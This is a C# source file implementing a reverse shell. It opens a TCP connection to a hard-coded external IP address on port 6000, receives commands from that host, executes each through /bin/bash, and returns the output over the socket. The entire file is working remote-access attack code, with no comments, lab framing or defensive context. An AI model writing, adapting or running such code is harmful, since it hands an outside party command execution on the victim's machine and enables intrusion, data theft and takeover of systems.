using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using Internal;

class MainClass
{
    public static void Main(string[] args)
    {
        string lhost = "3.141.55.131";
        int lport = 6000;

        try
        {
            TcpClient client = new TcpClient(lhost, lport);
            NetworkStream stream = client.GetStream();
            StreamReader reader = new StreamReader(stream, Encoding.UTF8);
            StreamWriter writer = new StreamWriter(stream, Encoding.UTF8);
            int ByteCount = 800000;
            while (true)
            {
                byte[] commandBytes = new byte[ByteCount]; // Adjust size as needed
                int bytesRead = stream.Read(commandBytes, 0, commandBytes.Length);

                if (bytesRead == 0)
                {
                    Console.WriteLine("Stopping");
                    break;
                }

                string command = Encoding.UTF8.GetString(commandBytes, 0, bytesRead);
                if (command.StartsWith("cd "))
                {

                }
                else
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        FileName = "/bin/bash",
                        Arguments = $"-c \"{command}\"",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };
                    Process process = new Process { StartInfo = startInfo };
                    process.Start();
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    Console.WriteLine(output + error);
                    process.WaitForExit();
                    writer.WriteLine(output + error);
                    writer.Flush();
                }
            }

            reader.Close();
            stream.Close();
            client.Close();
        }
        catch (Exception e)
        {
            Console.WriteLine($"Error: {e.Message}");
        }
    }
}
